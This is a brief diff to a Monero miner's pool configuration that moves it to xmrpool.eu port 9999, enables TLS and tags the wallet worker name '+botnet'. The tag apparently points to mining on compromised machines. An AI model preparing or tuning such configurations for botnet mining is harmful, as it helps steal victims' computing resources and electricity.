@@ -7,10 +7,10 @@
         {
             "coin": "monero",
             "algo": null,
-            "url": "xmrpool.eu:3333",
-            "user": "42ezxGiTsxdQJtfqkPG5jecaCPVD54RGXFvSYec8xzsMKtkdt7WmQKrUf18kQ1vvzPbjSAueG48K5QMgo6bhd3ZhJW5MBLV",
+            "url": "xmrpool.eu:9999",
+            "user": "42ezxGiTsxdQJtfqkPG5jecaCPVD54RGXFvSYec8xzsMKtkdt7WmQKrUf18kQ1vvzPbjSAueG48K5QMgo6bhd3ZhJW5MBLV+botnet",
             "pass": "x",
-            "tls": false,
+            "tls": true,
             "keepalive": true,
             "nicehash": false
         }
